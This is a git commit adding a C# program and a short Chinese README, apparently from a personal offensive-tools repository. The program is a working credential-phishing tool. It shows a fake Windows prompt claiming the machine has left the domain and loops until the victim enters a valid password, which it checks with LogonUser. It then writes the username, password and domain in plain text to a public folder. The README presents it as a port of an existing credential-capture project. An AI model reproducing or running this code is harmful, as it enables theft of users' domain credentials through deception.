ac762aeef6378ca55fe873d26016925aaee79a8d
九世 <422926799@qq.com>
2023-01-11 17:37:46 +0800

    Add files via upload

---
+++ 自己写的工具/CredUIPromptForWindowsCredentialsW_C#/ConsoleApp2/Program.cs
@@ -0,0 +1,209 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Collections.Generic;
+using System.Linq;
+using System.IO;
+using System.Text;
+
+namespace ConsoleApp2
+{
+    class Program
+    {
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        private struct CREDUI_INFO
+        {
+            public int cbSize;
+            public IntPtr hwndParent;
+            public string pszMessageText;
+            public string pszCaptionText;
+            public IntPtr hbmBanner;
+        }
+        private enum PromptForWindowsCredentialsFlags
+        {
+            /// <summary>
+            /// The caller is requesting that the credential provider return the user name and password in plain text.
+            /// This value cannot be combined with SECURE_PROMPT.
+            /// </summary>
+            CREDUIWIN_GENERIC = 0x1,
+            /// <summary>
+            /// The Save check box is displayed in the dialog box.
+            /// </summary>
+            CREDUIWIN_CHECKBOX = 0x2,
+            /// <summary>
+            /// Only credential providers that support the authentication package specified by the authPackage parameter should be enumerated.
+            /// This value cannot be combined with CREDUIWIN_IN_CRED_ONLY.
+            /// </summary>
+            CREDUIWIN_AUTHPACKAGE_ONLY = 0x10,
+            /// <summary>
+            /// Only the credentials specified by the InAuthBuffer parameter for the authentication package specified by the authPackage parameter should be enumerated.
+            /// If this flag is set, and the InAuthBuffer parameter is NULL, the function fails.
+            /// This value cannot be combined with CREDUIWIN_AUTHPACKAGE_ONLY.
+            /// </summary>
+            CREDUIWIN_IN_CRED_ONLY = 0x20,
+            /// <summary>
+            /// Credential providers should enumerate only administrators. This value is intended for User Account Control (UAC) purposes only. We recommend that external callers not set this flag.
+            /// </summary>
+            CREDUIWIN_ENUMERATE_ADMINS = 0x100,
+            /// <summary>
+            /// Only the incoming credentials for the authentication package specified by the authPackage parameter should be enumerated.
+            /// </summary>
+            CREDUIWIN_ENUMERATE_CURRENT_USER = 0x200,
+            /// <summary>
+            /// The credential dialog box should be displayed on the secure desktop. This value cannot be combined with CREDUIWIN_GENERIC.
+            /// Windows Vista: This value is not supported until Windows Vista with SP1.
+            /// </summary>
+            CREDUIWIN_SECURE_PROMPT = 0x1000,
+            /// <summary>
+            /// The credential provider should align the credential BLOB pointed to by the refOutAuthBuffer parameter to a 32-bit boundary, even if the provider is running on a 64-bit system.
+            /// </summary>
+            CREDUIWIN_PACK_32_WOW = 0x10000000,
+        }
+        public enum LogonType
+        {
+            /// <summary>
+            /// This logon type is intended for users who will be interactively using the computer, such as a user being logged on  
+            /// by a terminal server, remote shell, or similar process.
+            /// This logon type has the additional expense of caching logon information for disconnected operations;
+            /// therefore, it is inappropriate for some client/server applications,
+            /// such as a mail server.
+            /// </summary>
+            LOGON32_LOGON_INTERACTIVE = 2,
+
+            /// <summary>
+            /// This logon type is intended for high performance servers to authenticate plaintext passwords.
+
+            /// The LogonUser function does not cache credentials for this logon type.
+            /// </summary>
+            LOGON32_LOGON_NETWORK = 3,
+
+            /// <summary>
+            /// This logon type is intended for batch servers, where processes may be executing on behalf of a user without
+            /// their direct intervention. This type is also for higher performance servers that process many plaintext
+            /// authentication attempts at a time, such as mail or Web servers.
+            /// The LogonUser function does not cache credentials for this logon type.
+            /// </summary>
+            LOGON32_LOGON_BATCH = 4,
+
+            /// <summary>
+            /// Indicates a service-type logon. The account provided must have the service privilege enabled.
+            /// </summary>
+            LOGON32_LOGON_SERVICE = 5,
+
+            /// <summary>
+            /// This logon type is for GINA DLLs that log on users who will be interactively using the computer.
+            /// This logon type can generate a unique audit record that shows when the workstation was unlocked.
+            /// </summary>
+            LOGON32_LOGON_UNLOCK = 7,
+
+            /// <summary>
+            /// This logon type preserves the name and password in the authentication package, which allows the server to make
+            /// connections to other network servers while impersonating the client. A server can accept plaintext credentials
+            /// from a client, call LogonUser, verify that the user can access the system across the network, and still
+            /// communicate with other servers.
+            /// NOTE: Windows NT:  This value is not supported.
+            /// </summary>
+            LOGON32_LOGON_NETWORK_CLEARTEXT = 8,
+
+            /// <summary>
+            /// This logon type allows the caller to clone its current token and specify new credentials for outbound connections.
+            /// The new logon session has the same local identifier but uses different credentials for other network connections.
+            /// NOTE: This logon type is supported only by the LOGON32_PROVIDER_WINNT50 logon provider.
+            /// NOTE: Windows NT:  This value is not supported.
+            /// </summary>
+            LOGON32_LOGON_NEW_CREDENTIALS = 9,
+        }
+
+        public enum LogonProvider
+        {
+            /// <summary>
+            /// Use the standard logon provider for the system.
+            /// The default security provider is negotiate, unless you pass NULL for the domain name and the user name
+            /// is not in UPN format. In this case, the default provider is NTLM.
+            /// NOTE: Windows 2000/NT:   The default security provider is NTLM.
+            /// </summary>
+            LOGON32_PROVIDER_DEFAULT = 0,
+            LOGON32_PROVIDER_WINNT35 = 1,
+            LOGON32_PROVIDER_WINNT40 = 2,
+            LOGON32_PROVIDER_WINNT50 = 3
+        }
+
+        public enum CredUIReturnCodes
+        {
+            NO_ERROR = 0,
+            ERROR_CANCELLED = 1223,
+            ERROR_NO_SUCH_LOGON_SESSION = 1312,
+            ERROR_NOT_FOUND = 1168,
+            ERROR_INVALID_ACCOUNT_NAME = 1315,
+            ERROR_INSUFFICIENT_BUFFER = 122,
+            ERROR_INVALID_PARAMETER = 87,
+            ERROR_INVALID_FLAGS = 1004,
+            ERROR_BAD_ARGUMENTS = 160
+        }
+
+        [DllImport("credui.dll", CharSet = CharSet.Auto)]
+        private static extern uint CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere, int authError, ref uint authPackage, IntPtr InAuthBuffer, uint InAuthBufferSize, out IntPtr refOutAuthBuffer, out uint refOutAuthBufferSize, ref bool fSave, PromptForWindowsCredentialsFlags flags);
+
+        [DllImport("credui.dll", CharSet = CharSet.Auto)]
+        private static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
+
+        [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        internal static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName, [MarshalAs(UnmanagedType.LPStr)] string pszDomain, [MarshalAs(UnmanagedType.LPStr)] string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
+
+        [DllImport("credui.dll", EntryPoint = "CredUIParseUserNameW", CharSet = CharSet.Unicode)]
+        private static extern CredUIReturnCodes CredUIParseUserName(
+        string userName,
+        StringBuilder user,
+        int userMaxChars,
+        StringBuilder domain,
+        int domainMaxChars);
+        static void Main(string[] args)
+        {
+            CREDUI_INFO credui = new CREDUI_INFO();
+            credui.pszCaptionText = "请输入当前用户账号密码:";
+            credui.pszMessageText = "您的机器已脱域，请重新认证";
+            credui.cbSize = Marshal.SizeOf(credui);
+            uint authPackage = 0;
+            IntPtr outCredBuffer = new IntPtr();
+            uint outCredSize;
+            bool save = false;
+            var usernameBuf = new StringBuilder(100);
+            var passwordBuf = new StringBuilder(100);
+            var domainBuf = new StringBuilder(100);
+            var parsedUserName = new StringBuilder(100);
+            var parsedDomain = new StringBuilder(100);
+            int maxUserName = 100;
+            int maxDomain = 100;
+            int maxPassword = 100;
+            IntPtr hToken = IntPtr.Zero;
+            while (true)
+            {
+                uint result = CredUIPromptForWindowsCredentials(ref credui, 0, ref authPackage, IntPtr.Zero, 0, out outCredBuffer, out outCredSize, ref save, PromptForWindowsCredentialsFlags.CREDUIWIN_ENUMERATE_CURRENT_USER /* Generic */);
+                if (result == 0)
+                {
+                    if (CredUnPackAuthenticationBuffer(1, outCredBuffer, outCredSize, usernameBuf, ref maxUserName, domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
+                    {
+                        CredUIReturnCodes returnCode = CredUIParseUserName(usernameBuf.ToString(), parsedUserName, int.MaxValue, parsedDomain, int.MaxValue);
+                        if (returnCode == CredUIReturnCodes.NO_ERROR)
+                        {
+                            bool bLoginStatus = LogonUser(parsedUserName.ToString(), parsedDomain.ToString(), passwordBuf.ToString(), 3, 0, ref hToken);
+                            if (bLoginStatus == true)
+                            {
+                                string text = "username:" + usernameBuf.ToString() + " password:" + passwordBuf.ToString() + " domain:" + domainBuf.ToString();
+                                using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\\Users\\Public\\ver.txt", true))
+                                {
+                                    file.WriteLine(text);
+                                }
+                                break;
+                            }
+
+
+                        }
+
+                    }
+
+                }
+            }
+        }
+    }
+}
---
+++ 自己写的工具/CredUIPromptForWindowsCredentialsW_C#/README.md
@@ -0,0 +1,4 @@
+源项目地址:https://github.com/Rvn0xsy/GetWindowsCredentials/tree/master/GetWindowsCredentials    
+修改成C#版，凭证正确记录在C:\Users\Public\ver.txt    
+![](1.png)
+![](2.png)
